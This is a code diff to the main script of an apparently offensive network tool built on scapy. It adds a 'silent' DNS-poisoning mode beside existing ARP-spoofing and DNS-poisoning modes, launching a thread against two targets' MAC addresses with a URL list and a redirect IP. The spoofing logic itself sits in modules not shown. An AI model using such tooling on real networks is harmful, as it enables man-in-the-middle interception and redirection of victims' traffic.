@@ -3,6 +3,7 @@ import threading
 from scapy.all import *
 from ArpSpoofing import ArpSpoofing
 from DnsPoisoning import DnsPoisoning
+from SilentDnsPoisoning import SilentDnsPoisoning
 
 if __name__ == "__main__":
     #global variables
@@ -104,13 +105,24 @@ if __name__ == "__main__":
         except:
             print("Thread arp failed to start")
     elif modeOfAttack == "dns":
-        dnsPoisoning = DnsPoisoning(interface)
-        try:
-            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(target1, target2, target1MAC, target2MAC, urlList, silent, ipToSendTo))
-            dnsPoison.daemon = True
-            dnsPoison.start()
-        except:
-            print("Thread dns failed to start")
+        if silent:
+            dnsPoisoning = SilentDnsPoisoning(interface)
+            try:
+                dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison,
+                                             args=(target1, target2, target1MAC, target2MAC, urlList, ipToSendTo))
+                dnsPoison.daemon = True
+                dnsPoison.start()
+            except:
+                print("Thread dns failed to start")
+        else:
+            dnsPoisoning = DnsPoisoning(interface)
+            try:
+                dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison,
+                                             args=(target1, target2, target1MAC, target2MAC, urlList, ipToSendTo, timeSleep))
+                dnsPoison.daemon = True
+                dnsPoison.start()
+            except:
+                print("Thread dns failed to start")
 
 
     else:
